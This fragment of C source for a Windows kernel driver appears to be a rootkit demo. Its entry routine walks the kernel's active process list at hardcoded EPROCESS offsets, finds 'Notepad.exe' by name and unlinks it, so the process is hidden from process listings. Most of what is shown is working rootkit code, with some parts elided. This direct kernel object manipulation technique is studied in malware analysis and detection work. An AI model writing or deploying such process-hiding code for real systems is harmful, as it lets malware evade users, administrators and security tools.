...
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	...
	DebugMessage("Hiding process loaded...");

    PEPROCESS currentEprocess = NULL;
    currentEprocess = (PEPROCESS)PsGetCurrentProcess();

    PLIST_ENTRY pNode, pBuf;
    pNode = NULL;
    pBuf = NULL;
    unsigned char* peped = NULL;
    peped = (unsigned char*)currentEprocess;
    pNode = pBuf = (PLIST_ENTRY)(peped + 0x448);
    int i = 0;
    while (i < 10000)
    {
        if (strncmp("Notepad.exe", (const char*)((unsigned char*)pNode + 0x160), 11) == 0)
        {
            pBuf->Flink = pNode->Flink;
            pNode->Flink->Blink = pNode->Blink;
            pNode->Flink = pNode;
            pNode->Blink = pNode;
            DebugMessage("Process %s hidden", (const char*)((unsigned char*)pNode + 0x160));
            break;
        }
        pBuf = pNode;
        pNode = pNode->Flink;
...
{
	UNREFERENCED_PARAMETER(pDriverObject);
	DebugMessage("Hiding process unloaded...");
	return STATUS_SUCCESS;
}
